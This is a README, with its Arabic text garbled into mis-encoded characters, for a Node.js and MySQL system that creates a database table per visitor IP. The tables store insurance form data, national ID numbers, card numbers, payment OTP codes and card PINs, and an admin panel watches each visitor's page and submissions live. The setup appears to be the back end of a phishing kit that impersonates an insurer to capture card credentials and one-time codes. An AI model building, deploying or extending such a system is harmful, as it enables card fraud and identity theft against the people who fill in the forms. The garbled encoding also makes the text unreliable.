# ğŸ¯ QIIC Dynamic Tables System

## Ø§Ù„Ù…ÙÙ‡ÙˆÙ… Ø§Ù„Ø£Ø³Ø§Ø³ÙŠ

**ÙƒÙ„ Ø²Ø§Ø¦Ø± ÙŠØ­ØµÙ„ Ø¹Ù„Ù‰ Ø¬Ø¯ÙˆÙ„ Ø®Ø§Øµ Ø¨Ù‡ ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª!**

- Ø¹Ù†Ø¯ Ø£ÙˆÙ„ Ø¯Ø®ÙˆÙ„ Ù„Ù„Ù…ÙˆÙ‚Ø¹ â†’ ÙŠÙ†Ø´Ø£ Ø¬Ø¯ÙˆÙ„ Ø¨Ø§Ø³Ù… `visitor_<IP>`
- ÙƒÙ„ Ù†Ù…ÙˆØ°Ø¬ ÙŠØªÙ… ØªØ¹Ø¨Ø¦ØªÙ‡ â†’ ÙŠÙØ­ÙØ¸ ÙÙŠ Ø¬Ø¯ÙˆÙ„ Ø§Ù„Ø²Ø§Ø¦Ø± Ø§Ù„Ø®Ø§Øµ
- Ø§Ù„Ø£Ø¯Ù…Ù† ÙŠØ±Ù‰ â†’ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¬Ø¯Ø§ÙˆÙ„ ÙˆØ¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙŠ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„ÙØ¹Ù„ÙŠ

---

## ğŸ“Š Ø¨Ù†ÙŠØ© Ø§Ù„Ù†Ø¸Ø§Ù…

### 1. Ø§Ù„Ø¬Ø¯ÙˆÙ„ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ: `visitor_tables`
ÙŠØªØªØ¨Ø¹ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø²ÙˆØ§Ø± ÙˆØ§Ù„Ø¬Ø¯Ø§ÙˆÙ„ Ø§Ù„Ø®Ø§ØµØ© Ø¨Ù‡Ù…:

```sql
ip_address | table_name         | created_at | last_activity | is_active | current_page
-----------|-------------------|------------|---------------|-----------|-------------
192.168.1.1| visitor_192_168_1_1| 2024-...   | 2024-...      | 1         | /payment
10.0.0.5   | visitor_10_0_0_5   | 2024-...   | 2024-...      | 0         | /quote
```

### 2. Ø§Ù„Ø¬Ø¯Ø§ÙˆÙ„ Ø§Ù„Ø¯ÙŠÙ†Ø§Ù…ÙŠÙƒÙŠØ©: `visitor_<IP>`
ÙƒÙ„ Ø²Ø§Ø¦Ø± Ù„Ù‡ Ø¬Ø¯ÙˆÙ„ Ù…Ù†ÙØµÙ„ ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰:

```sql
-- Ù…Ø«Ø§Ù„: visitor_192_168_1_1
id | data_type      | data_json                          | page_name     | step_number | created_at
---|----------------|-----------------------------------|---------------|-------------|------------
1  | car_details    | {"make":"Toyota","model":"Camry"} | /car-details  | 1           | 2024-...
2  | insurance_info | {"name":"Ahmad","qid":"123..."}   | /insurance-info| 5          | 2024-...
3  | payment_qpay   | {"cardNumber":"1234..."}          | /payqpay      | 8           | 2024-...
4  | payment_otp    | {"otpCode":"123456"}              | /payment-otp  | 9           | 2024-...
```

---

## ğŸš€ Ø§Ù„ØªØ«Ø¨ÙŠØª ÙˆØ§Ù„Ø¥Ø¹Ø¯Ø§Ø¯

### Ø§Ù„Ø®Ø·ÙˆØ© 1: Ø¥Ù†Ø´Ø§Ø¡ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª

```bash
# ÙÙŠ phpMyAdmin Ø£Ùˆ MySQL Client
mysql -u root -p u262632985_qic < database/dynamic-tables-schema.sql
```

### Ø§Ù„Ø®Ø·ÙˆØ© 2: ØªØ«Ø¨ÙŠØª Ø§Ù„ØªØ¨Ø¹ÙŠØ§Øª

```bash
cd backend
npm install mysql2
```

### Ø§Ù„Ø®Ø·ÙˆØ© 3: ØªÙƒÙˆÙŠÙ† .env

```env
# Database
DB_HOST=localhost
DB_USER=u262632985_qicweb
DB_PASSWORD=your_password
DB_NAME=u262632985_qic

# Server
PORT=4000
NODE_ENV=production

# CORS
CORS_ORIGIN=https://ielts.sbs,https://www.ielts.sbs
```

### Ø§Ù„Ø®Ø·ÙˆØ© 4: ØªØ´ØºÙŠÙ„ Ø§Ù„Ø³ÙŠØ±ÙØ±

```bash
# Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ù†Ø¸Ø§Ù… Ø§Ù„Ø¯ÙŠÙ†Ø§Ù…ÙŠÙƒÙŠ Ø§Ù„Ø¬Ø¯ÙŠØ¯
node server-dynamic.js

# Ø£Ùˆ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø³ÙŠØ±ÙØ± Ø§Ù„Ù‚Ø¯ÙŠÙ…
node server.js
```

---

## ğŸ“¡ ÙƒÙŠÙ ÙŠØ¹Ù…Ù„ Ø§Ù„Ù†Ø¸Ø§Ù…ØŸ

### 1. Ø¯Ø®ÙˆÙ„ Ø§Ù„Ø²Ø§Ø¦Ø± Ù„Ù„Ù…ÙˆÙ‚Ø¹

```javascript
// Frontend: Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠØ©
socket.emit('userIdentify', { ip: userIp });

// Backend: Ø¥Ù†Ø´Ø§Ø¡ Ø¬Ø¯ÙˆÙ„ Ù„Ù„Ø²Ø§Ø¦Ø±
await createVisitorTable(ip);
// Result: ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø¬Ø¯ÙˆÙ„ visitor_192_168_1_100
```

### 2. ØªØ¹Ø¨Ø¦Ø© Ø§Ù„Ù†Ù…Ø§Ø°Ø¬

```javascript
// Frontend: Ø¹Ù†Ø¯ Ø¥Ø±Ø³Ø§Ù„ Ù†Ù…ÙˆØ°Ø¬ ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ø³ÙŠØ§Ø±Ø©
const carData = {
  make: 'Toyota',
  model: 'Camry',
  year: 2023
};

socket.emit('submitFormData', {
  ip: userIp,
  page: '/car-details',
  data: carData
});

// Backend: Ø­ÙØ¸ ÙÙŠ Ø¬Ø¯ÙˆÙ„ Ø§Ù„Ø²Ø§Ø¦Ø±
await insertVisitorData(
  ip,
  'car_details',
  carData,
  '/car-details',
  1 // step number
);
```

### 3. Ø¹Ø±Ø¶ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙŠ Ø§Ù„Ø£Ø¯Ù…Ù†

```javascript
// Frontend: Ø§Ù„Ø£Ø¯Ù…Ù† ÙŠØ·Ù„Ø¨ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
socket.emit('loadAllVisitors');

// Backend: Ø¬Ù„Ø¨ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø²ÙˆØ§Ø± ÙˆØ¨ÙŠØ§Ù†Ø§ØªÙ‡Ù…
const allData = await getAllVisitorsData();
// Result: Ù‚Ø§Ø¦Ù…Ø© Ø¨Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø²ÙˆØ§Ø± Ù…Ø¹ ÙƒÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø®Ø§ØµØ© Ø¨Ù‡Ù…
```

---

## ğŸ¨ Ø£Ù…Ø«Ù„Ø© Ø§Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù…

### Ù…Ø«Ø§Ù„ 1: Ø¥Ù†Ø´Ø§Ø¡ Ø¬Ø¯ÙˆÙ„ Ù„Ø²Ø§Ø¦Ø± Ø¬Ø¯ÙŠØ¯

```sql
CALL CreateVisitorTable('192.168.1.100', @tableName, @success);
SELECT @tableName, @success;
-- Result: visitor_192_168_1_100, 1
```

### Ù…Ø«Ø§Ù„ 2: Ø¥Ø¶Ø§ÙØ© Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø³ÙŠØ§Ø±Ø©

```sql
CALL InsertVisitorData(
    '192.168.1.100',
    'car_details',
    '{"make": "Toyota", "model": "Camry", "year": 2023}',
    '/car-details',
    1,
    @success
);
```

### Ù…Ø«Ø§Ù„ 3: Ø¹Ø±Ø¶ Ø±Ø­Ù„Ø© Ø§Ù„Ø¹Ù…ÙŠÙ„ Ø§Ù„ÙƒØ§Ù…Ù„Ø©

```sql
CALL GetVisitorData('192.168.1.100');
-- Result: Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† Ø¬Ø¯ÙˆÙ„ visitor_192_168_1_100
```

### Ù…Ø«Ø§Ù„ 4: Ø¹Ø±Ø¶ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø²ÙˆØ§Ø± Ø§Ù„Ù†Ø´Ø·ÙŠÙ†

```sql
SELECT * FROM vw_active_visitors;
```

### Ù…Ø«Ø§Ù„ 5: Ø­Ø°Ù Ø²Ø§Ø¦Ø± Ù‚Ø¯ÙŠÙ…

```sql
CALL DeleteVisitorTable('192.168.1.100', @success);
-- Result: ØªÙ… Ø­Ø°Ù Ø§Ù„Ø¬Ø¯ÙˆÙ„ visitor_192_168_1_100
```

---

## ğŸ”§ Stored Procedures Ø§Ù„Ù…ØªÙˆÙØ±Ø©

### 1. `CreateVisitorTable(ip, @tableName, @success)`
ÙŠÙ†Ø´Ø¦ Ø¬Ø¯ÙˆÙ„ Ø¬Ø¯ÙŠØ¯ Ù„Ù„Ø²Ø§Ø¦Ø± Ø£Ùˆ ÙŠØ­Ø¯Ø« Ø§Ù„Ø¬Ø¯ÙˆÙ„ Ø§Ù„Ù…ÙˆØ¬ÙˆØ¯

### 2. `InsertVisitorData(ip, dataType, dataJson, pageName, stepNumber, @success)`
ÙŠØ¶ÙŠÙ Ø¨ÙŠØ§Ù†Ø§Øª Ø¬Ø¯ÙŠØ¯Ø© ÙÙŠ Ø¬Ø¯ÙˆÙ„ Ø§Ù„Ø²Ø§Ø¦Ø±

### 3. `GetVisitorData(ip)`
ÙŠØ¬Ù„Ø¨ Ø¬Ù…ÙŠØ¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø²Ø§Ø¦Ø± Ù…Ø­Ø¯Ø¯

### 4. `GetAllVisitors()`
ÙŠØ¬Ù„Ø¨ Ù‚Ø§Ø¦Ù…Ø© Ø¨Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø²ÙˆØ§Ø± ÙˆÙ…Ø¹Ù„ÙˆÙ…Ø§ØªÙ‡Ù… Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ©

### 5. `UpdateVisitorStatus(ip, isActive, currentPage, socketId)`
ÙŠØ­Ø¯Ø« Ø­Ø§Ù„Ø© Ø§Ù„Ø²Ø§Ø¦Ø± (Ù†Ø´Ø·/ØºÙŠØ± Ù†Ø´Ø·ØŒ Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø­Ø§Ù„ÙŠØ©ØŒ etc.)

### 6. `DeleteVisitorTable(ip, @success)`
ÙŠØ­Ø°Ù Ø¬Ø¯ÙˆÙ„ Ø§Ù„Ø²Ø§Ø¦Ø± Ø¨Ø§Ù„ÙƒØ§Ù…Ù„

### 7. `CleanupInactiveVisitors(daysInactive)`
ÙŠÙ†Ø¸Ù Ø§Ù„Ø²ÙˆØ§Ø± Ø§Ù„Ù‚Ø¯Ø§Ù…Ù‰ ØºÙŠØ± Ø§Ù„Ù†Ø´Ø·ÙŠÙ†

---

## ğŸ“Š Ù…Ø®Ø·Ø· Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         visitor_tables                   â”‚
â”‚  (Master Table - Tracks All Visitors)   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
               â”‚ Creates & Links To
               â”‚
               â–¼
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚  visitor_192_168_1_100   â”‚ â† Ø²Ø§Ø¦Ø± 1
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚ â€¢ car_details            â”‚
    â”‚ â€¢ insurance_info         â”‚
    â”‚ â€¢ payment_qpay           â”‚
    â”‚ â€¢ payment_otp            â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚  visitor_10_0_0_5        â”‚ â† Ø²Ø§Ø¦Ø± 2
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚ â€¢ car_details            â”‚
    â”‚ â€¢ more_details           â”‚
    â”‚ â€¢ quote                  â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
    
    â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
    â”‚  visitor_172_16_0_1      â”‚ â† Ø²Ø§Ø¦Ø± 3
    â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
    â”‚ â€¢ car_details            â”‚
    â”‚ â€¢ payment_dcc            â”‚
    â”‚ â€¢ payment_pin            â”‚
    â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## ğŸ¯ Ù…Ù…ÙŠØ²Ø§Øª Ø§Ù„Ù†Ø¸Ø§Ù…

âœ… **Ø¹Ø²Ù„ ÙƒØ§Ù…Ù„ Ù„Ù„Ø¨ÙŠØ§Ù†Ø§Øª** - ÙƒÙ„ Ø²Ø§Ø¦Ø± Ù„Ù‡ Ø¬Ø¯ÙˆÙ„ Ù…Ù†ÙØµÙ„
âœ… **Ù‚Ø§Ø¨Ù„ÙŠØ© ØªÙˆØ³Ø¹ Ø¹Ø§Ù„ÙŠØ©** - Ù„Ø§ Ø­Ø¯ Ù„Ø¹Ø¯Ø¯ Ø§Ù„Ø²ÙˆØ§Ø±
âœ… **Ø³Ù‡ÙˆÙ„Ø© Ø§Ù„Ø­Ø°Ù** - Ø­Ø°Ù Ø¬Ø¯ÙˆÙ„ ÙˆØ§Ø­Ø¯ = Ø­Ø°Ù Ø²Ø§Ø¦Ø± ÙˆÙƒÙ„ Ø¨ÙŠØ§Ù†Ø§ØªÙ‡
âœ… **ØªØªØ¨Ø¹ Ø§Ù„ÙˆÙ‚Øª Ø§Ù„ÙØ¹Ù„ÙŠ** - Ù…Ø¹Ø±ÙØ© Ø§Ù„ØµÙØ­Ø© Ø§Ù„Ø­Ø§Ù„ÙŠØ© ÙˆØ§Ù„Ù†Ø´Ø§Ø·
âœ… **Ù‡ÙŠÙƒÙ„ Ù…Ø±Ù†** - JSON data ÙŠØ³Ù…Ø­ Ø¨Ø£ÙŠ Ù†ÙˆØ¹ Ø¨ÙŠØ§Ù†Ø§Øª
âœ… **ØªÙ†Ø¸ÙŠÙ ØªÙ„Ù‚Ø§Ø¦ÙŠ** - Ø¥Ù…ÙƒØ§Ù†ÙŠØ© Ø­Ø°Ù Ø§Ù„Ø²ÙˆØ§Ø± Ø§Ù„Ù‚Ø¯Ø§Ù…Ù‰
âœ… **Ø£Ø¯Ø§Ø¡ Ø¹Ø§Ù„ÙŠ** - Indexes Ø¹Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø§Ù„Ù…Ù‡Ù…Ø©

---

## ğŸ› ï¸ API Endpoints

### REST API

```bash
# Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ IP Ø§Ù„Ø¹Ù…ÙŠÙ„
GET /api/client-ip

# Ø¹Ø±Ø¶ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø²ÙˆØ§Ø± (Ø£Ø¯Ù…Ù†)
GET /api/admin/visitors

# Ø¹Ø±Ø¶ Ø¨ÙŠØ§Ù†Ø§Øª Ø²Ø§Ø¦Ø± Ù…Ø­Ø¯Ø¯ (Ø£Ø¯Ù…Ù†)
GET /api/admin/visitor/:ip

# Ø­Ø°Ù Ø²Ø§Ø¦Ø± (Ø£Ø¯Ù…Ù†)
DELETE /api/admin/visitor/:ip

# Health check
GET /api/health
```

### Socket.IO Events

#### Ù…Ù† Ø§Ù„Ø¹Ù…ÙŠÙ„ Ù„Ù„Ø³ÙŠØ±ÙØ±:
- `userIdentify` - ØªØ¹Ø±ÙŠÙ Ø§Ù„Ø²Ø§Ø¦Ø±
- `pageChange` - ØªØºÙŠÙŠØ± Ø§Ù„ØµÙØ­Ø©
- `submitFormData` - Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù†Ù…ÙˆØ°Ø¬
- `submitPayment` - Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯ÙØ¹
- `submitOTP` - Ø¥Ø±Ø³Ø§Ù„ OTP
- `submitPIN` - Ø¥Ø±Ø³Ø§Ù„ PIN

#### Ù…Ù† Ø§Ù„Ø³ÙŠØ±ÙØ± Ù„Ù„Ø¹Ù…ÙŠÙ„:
- `visitorInitialized` - ØªÙ… Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø¬Ø¯ÙˆÙ„
- `dataSaved` - ØªÙ… Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
- `newVisitor` - Ø²Ø§Ø¦Ø± Ø¬Ø¯ÙŠØ¯ (Ù„Ù„Ø£Ø¯Ù…Ù†)
- `locationUpdated` - ØªØ­Ø¯ÙŠØ« Ø§Ù„ØµÙØ­Ø© (Ù„Ù„Ø£Ø¯Ù…Ù†)
- `newFormData` - Ø¨ÙŠØ§Ù†Ø§Øª Ø¬Ø¯ÙŠØ¯Ø© (Ù„Ù„Ø£Ø¯Ù…Ù†)

---

## ğŸ“ˆ Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª ÙˆØªØ­Ù„ÙŠÙ„Ø§Øª

### Ø¹Ø¯Ø¯ Ø§Ù„Ø²ÙˆØ§Ø± Ø§Ù„Ù†Ø´Ø·ÙŠÙ†

```sql
SELECT COUNT(*) AS active_visitors
FROM visitor_tables
WHERE is_active = 1;
```

### Ø§Ù„Ø²ÙˆØ§Ø± Ø­Ø³Ø¨ Ø§Ù„ØµÙØ­Ø©

```sql
SELECT current_page, COUNT(*) AS count
FROM visitor_tables
GROUP BY current_page
ORDER BY count DESC;
```

### Ù…ØªÙˆØ³Ø· ÙˆÙ‚Øª Ø§Ù„Ø¬Ù„Ø³Ø©

```sql
SELECT 
    AVG(TIMESTAMPDIFF(MINUTE, created_at, last_activity)) AS avg_session_minutes
FROM visitor_tables;
```

### Ø§Ù„Ø²ÙˆØ§Ø± Ø§Ù„Ø°ÙŠÙ† Ø£ÙƒÙ…Ù„ÙˆØ§ Ø§Ù„Ø¯ÙØ¹

```sql
SELECT COUNT(*) AS completed_payments
FROM visitor_tables vt
WHERE EXISTS (
    SELECT 1 FROM information_schema.tables t
    WHERE t.table_name = vt.table_name
    AND t.table_schema = DATABASE()
);
```

---

## ğŸ§ª Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±

### 1. Ø§Ø®ØªØ¨Ø§Ø± Ø¥Ù†Ø´Ø§Ø¡ Ø¬Ø¯ÙˆÙ„

```bash
# ÙÙŠ terminal
curl http://localhost:4000/api/client-ip
# Result: {"ip":"192.168.1.100"}

# ÙÙŠ MySQL
CALL CreateVisitorTable('192.168.1.100', @table, @success);
SELECT @table, @success;
```

### 2. Ø§Ø®ØªØ¨Ø§Ø± Ø¥Ø¶Ø§ÙØ© Ø¨ÙŠØ§Ù†Ø§Øª

```javascript
// ÙÙŠ Console
socket.emit('submitFormData', {
  ip: '192.168.1.100',
  page: '/car-details',
  data: { make: 'Toyota', model: 'Camry' }
});
```

### 3. Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø£Ø¯Ù…Ù†

```bash
curl http://localhost:4000/api/admin/visitors
# Result: Ù‚Ø§Ø¦Ù…Ø© Ø¨Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø²ÙˆØ§Ø±
```

---

## ğŸ” Ø§Ù„Ø£Ù…Ø§Ù†

- âœ… Rate limiting Ø¹Ù„Ù‰ API
- âœ… CORS Ù…Ø­Ø¯ÙˆØ¯ Ù„Ù†Ø·Ø§Ù‚Ø§Øª Ù…Ø¹ÙŠÙ†Ø©
- âœ… SQL injection Ù…Ø­Ù…ÙŠ Ø¹Ø¨Ø± Prepared Statements
- âœ… Helmet.js Ù„Ù„Ø£Ù…Ø§Ù†
- âœ… ØªÙ†Ø¸ÙŠÙ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‚Ø¯ÙŠÙ…Ø© ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹

---

## ğŸ“ Ù…Ù„Ø§Ø­Ø¸Ø§Øª Ù…Ù‡Ù…Ø©

1. **Ø£Ø³Ù…Ø§Ø¡ Ø§Ù„Ø¬Ø¯Ø§ÙˆÙ„**: ÙŠØªÙ… ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ù†Ù‚Ø§Ø· (`.`) ÙˆØ§Ù„Ù†Ù‚Ø·ØªÙŠÙ† (`:`) Ø¥Ù„Ù‰ Ø´Ø±Ø·Ø§Øª Ø³ÙÙ„ÙŠØ© (`_`)
   - Ù…Ø«Ø§Ù„: `192.168.1.100` â†’ `visitor_192_168_1_100`

2. **JSON Data**: Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ø­ÙÙˆØ¸Ø© Ø¨ØµÙŠØºØ© JSON Ù„Ù„Ù…Ø±ÙˆÙ†Ø©

3. **Step Numbers**: Ø±Ù‚Ù… Ø§Ù„Ø®Ø·ÙˆØ© ÙŠØ³Ø§Ø¹Ø¯ ÙÙŠ ØªØªØ¨Ø¹ ØªÙ‚Ø¯Ù… Ø§Ù„Ø²Ø§Ø¦Ø±

4. **Timestamps**: Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„Ø§Øª Ù„Ù‡Ø§ `created_at` Ùˆ `updated_at`

5. **Cascade Delete**: Ø­Ø°Ù Ø¬Ø¯ÙˆÙ„ Ø§Ù„Ø²Ø§Ø¦Ø± ÙŠØ­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø¨ÙŠØ§Ù†Ø§ØªÙ‡

---

## ğŸš¨ Ø§Ø³ØªÙƒØ´Ø§Ù Ø§Ù„Ø£Ø®Ø·Ø§Ø¡

### Ø§Ù„Ù…Ø´ÙƒÙ„Ø©: Ø§Ù„Ø¬Ø¯ÙˆÙ„ Ù„Ù… ÙŠÙÙ†Ø´Ø£

```sql
-- ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª
SHOW GRANTS FOR CURRENT_USER();

-- ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙˆÙ„ Ø§Ù„Ø±Ø¦ÙŠØ³ÙŠ
SHOW TABLES LIKE 'visitor_tables';
```

### Ø§Ù„Ù…Ø´ÙƒÙ„Ø©: Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø¥Ø¯Ø±Ø§Ø¬ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª

```sql
-- ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø²Ø§Ø¦Ø±
SELECT * FROM visitor_tables WHERE ip_address = '192.168.1.100';

-- ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø¬Ø¯ÙˆÙ„
SHOW TABLES LIKE 'visitor_192_168_1_100';
```

### Ø§Ù„Ù…Ø´ÙƒÙ„Ø©: Ø¨Ø·Ø¡ ÙÙŠ Ø§Ù„Ø£Ø¯Ø§Ø¡

```sql
-- ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù€ Indexes
SHOW INDEX FROM visitor_tables;

-- ØªØ­Ø³ÙŠÙ† Ø§Ù„Ø¬Ø¯Ø§ÙˆÙ„
OPTIMIZE TABLE visitor_tables;
```

---

## ğŸ“ Ø§Ù„Ø¯Ø¹Ù…

Ù„Ø£ÙŠ Ø§Ø³ØªÙØ³Ø§Ø±Ø§Øª Ø£Ùˆ Ù…Ø´Ø§ÙƒÙ„:
1. ØªØ­Ù‚Ù‚ Ù…Ù† logs ÙÙŠ `console.log`
2. Ø±Ø§Ø¬Ø¹ MySQL error logs
3. Ø§Ø³ØªØ®Ø¯Ù… `CALL GetAllVisitors()` Ù„Ù„ØªØ´Ø®ÙŠØµ

---

## ğŸ“ Ø§Ù„Ù…Ø²ÙŠØ¯ Ù…Ù† Ø§Ù„Ø£Ù…Ø«Ù„Ø©

Ø³ÙŠØªÙ… Ø¥Ø¶Ø§ÙØ© Ø£Ù…Ø«Ù„Ø© Ø¥Ø¶Ø§ÙÙŠØ© ÙÙŠ Ù…Ù„Ù `examples.md`

---

**ØªÙ… Ø§Ù„Ø¥Ù†Ø´Ø§Ø¡ Ø¨ÙˆØ§Ø³Ø·Ø©**: QIIC Development Team  
**Ø§Ù„ØªØ§Ø±ÙŠØ®**: 2024  
**Ø§Ù„Ù†Ø³Ø®Ø©**: 1.0.0
